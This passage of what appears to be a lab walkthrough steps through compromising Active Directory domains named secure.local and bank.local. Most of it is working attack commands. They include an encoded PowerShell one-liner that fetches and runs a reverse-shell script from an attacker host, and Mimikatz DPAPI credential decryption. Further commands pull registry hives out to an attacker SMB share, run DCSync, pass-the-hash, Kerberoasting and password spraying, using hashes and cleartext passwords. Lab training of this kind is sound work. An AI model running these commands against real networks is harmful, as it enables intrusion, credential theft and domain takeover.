![](<../../../.gitbook/assets/image (74).png>)

15\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin Administrator using impackets getST.py script. Fill in the password `123456`.

```
getST.py secure/FAKE01@10.0.0.100 -spn cifs/data01.secure.local -impersonate administrator -dc-ip 10.0.0.100
```

![](<../../../.gitbook/assets/image (71).png>)

Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.

```
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass data01.secure.local
```

![](<../../../.gitbook/assets/image (1).png>)

16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;

```
crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc -x whoami
```

![](<../../../.gitbook/assets/image (13) (1).png>)

17\. We could get a shell the same way as we did before.

```
crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
```

![](<../../../.gitbook/assets/image (14) (1).png>)

### 11. Dumping DPAPI

**Task: Look for saved credentials on the machine (DPAPI).**

1. One of the things I like to do when gaining access to a system is running [Seatbelt](https://github.com/GhostPack/Seatbelt). This tool will check many things like permissions, groups and for stored credentials. First we need to download Seatbelt.exe on the target and then run Seatbelt:

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://192.168.248.2:8090/Seatbelt.exe","C:\users\public\Seatbelt.exe") 
.\Seatbelt.exe --group=user
```

2\. In the output of the section WindowsCredentialFiles we can see that the user `sa_sql` has some credentials saved:

![](<../../../.gitbook/assets/image (17).png>)

4\. We can find the master encryption key id and some information about the saved credentials with the following Mimikatz command using the previous path and FileName:

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://192.168.248.2:8090/mimikatz.exe","C:\users\public\mimikatz.exe") 
./mimikatz.exe "dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD" "exit"
```

{% hint style="info" %}
The latest compiled version of Mimikatz doesn't work on server 2022. Compiling the latest commit with Visual Studio 2019 gave me some errors, but this [https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64](https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64) repostorie/pull request worked for me without errors! I really hate compiling tools like this, always errors :cry:
{% endhint %}

![](<../../../.gitbook/assets/image (20).png>)

The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it.

5\. The next step is to retrieve the masterkey with the password of the user. Luckily we already know the password of the `sa_sql` user, which is `Iloveyou2`. With the following Mimikatz command we can retrieve the masterkey:

```
./mimikatz.exe "dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected" "exit"
```

For some reason I kept getting errors, even If I gained a shell as `sa_sql` through crackmapexec. We already owned the machine so maybe we could just RDP into it. But RDP is disabled:

![](<../../../.gitbook/assets/image (35).png>)

We could always just enable RDP with the following commands:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

We also have to add our user to the local admin group and Remote Desktop Users group:

```
net localgroup administrators sa_sql /add 
net localgroup "Remote Desktop Users" sa_sql /add
```

![](<../../../.gitbook/assets/image (13).png>)

If we scan with Nmap now port 3389 is open:

![](<../../../.gitbook/assets/image (45).png>)

We now can RDP into the machine with for example Xfreerdp:

```
xfreerdp /u:'secure\sa_sql' /p:Iloveyou2 /v:10.0.0.101
```

If we now run the same Mimikatz.exe command we receive the masterkey:

```
./mimikatz.exe "dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected" "exit"
```

![](<../../../.gitbook/assets/image (62).png>)

7\. Now we can read the saved credentials with the masterkey using the following Mimikatz command:

```
./mimikatz.exe "dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD /masterkey:b3e8630e96acba990f836b4462a9285a4c987776f17f11b2559d9fdf67d03cf6b99dd89445d5641aef6f4477f7354eb6f19e3053e1d56712f45bc227249cdea2" "exit"
```

![](<../../../.gitbook/assets/image (63) (1).png>)

We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`. We can quickly check if this is correct with Crackmapexec:

```
crackmapexec smb 10.0.0.100 -u sa_backup -p LS6RV5o8T9
```

![](<../../../.gitbook/assets/image (46) (1).png>)

The login is succesfull, so the password is correct. The last thing to do is to remove the tools we placed on the machine and we should disable RDP again to not leave any changes to the system.

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 
netsh advfirewall firewall set rule group="remote desktop" new enable=No
```

### 12. Privileged groups

**Task: Become domain admin by abusing the "Backup Operators" group.**

1. When we look at the user `sa_backup` we see that he is a member of multiple high privileged groups, such as `Server Operators`, `Account Operators` and `Backup Operators`. In this section we will abuse the last group to become `Domain Admin`. This group can read files on the domain controller.
2. To execute the **** [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool which is able to dump the sam using these privileges we need to host our own public smb share. we can do this with the smbserver.py script from Impacket. This will create a share on `\\192.168.248.2\share`.

```
mkdir ~/adlab/share
python3 /opt/impacket/examples/smbserver.py share ~/adlab/share -smb2support
```

![](<../../../.gitbook/assets/image (27).png>)

3\. The next step is to execute the BackupOperatorToDa tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share. But first we have to download it on `DATA01` in the shell:

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://192.168.248.2:8090/BackupOperatorToDA.exe","C:\users\public\BackupOperatorToDA.exe") 
.\BackupOperatorToDA.exe -t \\dc03.secure.local -u sa_backup -p LS6RV5o8T9 -d secure.local -o \\192.168.248.2\share\
```

4\. After a couple of minutes when we share the directory `~/adlab/share` we see that the files `SAM`, `SYSTEM` and `SECURITY` are there.

![](<../../../.gitbook/assets/image (41).png>)

5\. The next step is to run [SecretDump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) from Impacket to retrieve the machine account NTLM hash out of these HIVE dumps:

```
secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURITY -sam ~/adlab/share/SAM
```

![](<../../../.gitbook/assets/image (18) (1).png>)

6\. The last step is to run Secretsdump.py to run DCsync and retrieve all the domain account hashes using the computeraccount:

```
secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
```

![](<../../../.gitbook/assets/image (57) (1).png>)

7\. We retrieved the Administrator hash and can authenticate as `Domain Admin` to the Domain Controller `DC03` of `Secure.local`.

![](<../../../.gitbook/assets/image (69) (1).png>)

### 13. Kerberoast

**Task: Check for interesting user attributes across the trust to `bank.local`.**

1. Use these credentials with [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket and kerberoast accross the bidrectional external trust.

```
python3 /opt/impacket/examples/GetUserSPNs.py 'secure.local/Administrator' -dc-ip 10.0.0.2 -target-domain bank.local -hashes :a59cc2e81b2835c6b402634e584a8edc -outputfile kerberoast.txt
```

![](<../../../.gitbook/assets/image (18).png>)

2\. We retrieved one hash. Lets crack it with Hashcat.

```
.\hashcat.exe -a 0 -m 13100 .\kerberoast.txt .\wordlists\rockyou.txt -r .\rules\dive.rule
```

![](<../../../.gitbook/assets/image (21).png>)

We successfully cracked the password of the user `sa_admin`, the password is `Welcome123456!`

### 14. Take over Forest

**Task: Take over the `bank.local` forest.**

1. We can spray these credentials with CrackMapExec to check if we see a `Pwn3d!` on both of the Domain Controllers `dc01.bank.local` and  `dc02.amsterdam.bank.local`:

```
crackmapexec smb 10.0.0.2 10.0.0.3 -d bank.local -u sa_admin -p 'Welcome123456!'
```

![](<../../../.gitbook/assets/image (15).png>)

We successfully owned all three the domains!

## Cleanup

Set back the SQL server xp\_cmdshell

